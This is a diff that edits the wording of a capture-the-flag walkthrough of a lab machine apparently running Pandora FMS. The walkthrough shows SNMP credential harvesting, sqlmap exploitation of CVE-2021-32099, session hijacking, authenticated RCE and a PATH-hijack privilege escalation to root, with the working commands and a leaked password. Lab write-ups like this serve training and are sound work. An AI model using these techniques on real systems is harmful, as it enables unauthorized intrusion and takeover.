@@ -41,7 +41,7 @@ OS and Service detection performed. Please report any incorrect results at https
 # Nmap done at Fri Sep  4 09:50:09 2026 -- 1 IP address (1 host up) scanned in 38.55 seconds
 ```
 
-Navigated to port 80 -> nothing interesting here
+Navigating to port 80 turns up nothing interesting.
 
 ```
 # Nmap 7.98 scan initiated Fri Sep  4 09:50:09 2026 as: /usr/lib/nmap/nmap -sU -sV -F -open -oN udp_scan_results.txt 10.129.6.40
@@ -63,15 +63,13 @@ Service detection performed. Please report any incorrect results at https://nmap
 onesixtyone -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt 10.129.6.40
 ```
 
-- `public` - identified a community string
+It identified `public` as the community string:
 
 ```sh
 snmpwalk -v1 -c public 10.129.6.40
 ```
 
-- WAIT.....WAIT FOR A LONG TIME
-
-And finally it revealed clear-text strings — user & pass:
+The walk takes a long time — but eventually it revealed clear-text strings, user & pass:
 
 ```sh
 <SNIP>
@@ -90,7 +88,7 @@ iso.3.6.1.2.1.25.4.2.1.5.1114 = STRING: "-u daniel -p HotelBabylon23"
 
 # User
 
-SSH in as daniel — but **matt** holds the user flag.
+SSH in as daniel, but **matt** holds the user flag.
 
 ```sh
 netstat -antp
@@ -110,7 +108,7 @@ tcp6       0      0 :::22                   :::*                    LISTEN      
 
 ```
 
-Looks like a web server is hosted internally. Local port forward — the target isn't configured for dynamic forwarding:
+A web server is running internally. Set up a local port forward — the target isn't configured for dynamic forwarding:
 
 ```sh
 ssh -L 80:127.0.0.1:80 daniel@10.129.6.40
@@ -118,11 +116,7 @@ ssh -L 80:127.0.0.1:80 daniel@10.129.6.40
 
 > Version => `PANDORA FMS v7.0NG.742_FIX_PERL2020`
 
-Tried to login as Daniel but it errored out.
-
-Google scroll revealed RCE-with-authentication is possible.
-
-To gain authentication: Unauthenticated SQL Injection (CVE-2021-32099)
+Logging in as Daniel errors out, so a bit of Googling revealed that RCE with authentication is possible. To gain that authentication, we need the unauthenticated SQL injection in CVE-2021-32099:
 
 > Reference : https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/
 
@@ -142,42 +136,38 @@ sqlmap --url "http://localhost/pandora_console/include/chart_generator.php?sessi
 sqlmap --url "http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables 
 ```
 
-178 tables in total but **2** look interesting:
-- `tpassword_history`
-- `tsession_php`
-
-Fetch them with `sqlmap`:
+Of the 178 tables, **2** look interesting: `tpassword_history` and `tsession_php`. Fetch them with `sqlmap`:
 
 ```sh
 sqlmap --url "http://localhost/pandora_console/include/chart_generator.php?session_id=''" -T tpassword_history --dump
 ```
 
-- Can't able to decrypt the password
+The password history couldn't be decrypted, so dump the second table instead:
 
 ```sh
 sqlmap --url "http://localhost/pandora_console/include/chart_generator.php?session_id=''" -T tsession_php --dump
 ```
 
-Here we got the **session id** of user `matt`
+This gives us the **session ID** of user `matt`
 
 > Note: **Cookie manager** didn't do a good job
 
-Use it in the session_id parameter of the url:
+Drop it into the `session_id` parameter of the URL:
 
 ```url
 http://localhost/pandora_console/include/chart_generator.php?session_id=g4e01qdgk36mfdh90hvcc54umq
 ```
 
-Once it loads, navigate to the home page -> authenticated as `matt`
+Once it loads, navigate to the home page — we're authenticated as `matt`.
 
-Now we are authenticated — there are 2 ways to get RCE:
-- CVE-2020-5844 : RCE -> https://github.com/UNICORDev/exploit-CVE-2020-5844 - Won't work because we're restricted from that page
-- CVE-2020-13851 : RCE -> https://packetstorm.news/files/id/158390 - Worked
+Now that we're authenticated, there are 2 ways to get RCE:
+
+- CVE-2020-5844 : RCE -> https://github.com/UNICORDev/exploit-CVE-2020-5844 - won't work, we're restricted from that page
+- CVE-2020-13851 : RCE -> https://packetstorm.news/files/id/158390 - this one worked
 
 ### Burpsuite
 
-- To listen to localhost we have to configure **firefox**
-	- In url => `about:config` -> `network.proxy.allow_hijacking_localhost` -> true
+To listen to localhost we have to configure **firefox** first — in the url, set `about:config` -> `network.proxy.allow_hijacking_localhost` -> true.
 
 Now we can intercept the local traffic — the setting is usually false as a safety precaution.
 
@@ -189,47 +179,42 @@ Grab the `ajax` endpoint's **POST** request — it fires when you click the **ev
 
 Reviewing the reference shows which parameter to modify — the **target** parameter **holds** the **payload**.
 
-Edited the request according to the reference:
-
-- Gained an **unstable shell** as **matt**, so stabilized with a python one-liner and added an ssh public key
-- Gained a stable shell as **matt**
+Editing the request according to the reference gains an **unstable shell** as **matt**, so stabilize it with a Python one-liner and add an SSH public key for a stable shell as **matt**.
 
 # Root
 
-- Listing **sudoers** requires a password
-- Look for binaries with SUID permissions:
+Listing **sudoers** requires a password, so look for binaries with SUID permissions instead:
 
 ```
 find / -perm -4000 2>/dev/null
 ```
 
-The below command lists in **detail** by executing ls after finding it:
+This command lists the results in **detail** by executing ls after finding them:
 
 ```
 find / -perm -4000 -exec ls -al {} \; 2>/dev/null
 ```
 
-- `/usr/bin/pandora_backup` -> SUID binary that can be read and executed by **matt**
+`/usr/bin/pandora_backup` turns up — a SUID binary that can be read and executed by **matt**.
 
 > **strings** binary is not available in target
 
-- Started a python server to transfer the binary to the attacker
-- Reviewed it with strings
+We started a python server to transfer the binary to the attacker and reviewed it with strings.
 
 Looks like it calls the **tar** binary to back up files — and it doesn't use an absolute path.
 
-Set the PATH variable to tmp:
+Prepend `/tmp` to the PATH variable:
 
 ```sh
 export PATH="/tmp:$PATH"
 ```
 
-Create a tar binary with shell in it in the tmp directory:
+Create a fake tar binary with a shell payload in the tmp directory:
 
 ```sh
 echo "/bin/bash -p" > tar
 ```
 
-- execute the `pandora_backup` binary
+Then execute the `pandora_backup` binary.
 
 Gained `root`
